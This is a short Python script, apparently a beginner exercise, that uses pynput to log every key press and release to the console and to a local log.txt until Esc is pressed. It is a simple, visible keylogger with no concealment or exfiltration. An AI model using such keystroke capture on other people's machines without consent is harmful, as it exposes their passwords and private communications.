from pynput.keyboard import Key, Listener




def keylogpressed(key):

    pressed = str(key)
    try:
        pressed = key.char
        print(f'Key pressed {pressed}')

    except AttributeError:
        pressed = 'special key {0} pressed'.format(key)
        print(pressed)


    print(f'You entered {pressed}')

    
    with open("log.txt", "a") as f:
        f.write(pressed)

    if key == Key.esc:
        # Stop listener
        return False

def keylogreleased(key):

    released = '{0} released'.format(key)
    


    print(f'You released {released}')

    
    with open("log.txt", "a") as f:
        f.write(released)

    if key == Key.esc:
        # Stop listener
        return False




# Collect all event until released
with Listener(on_press = keylogpressed, on_release=keylogreleased) as listener:   
    listener.join()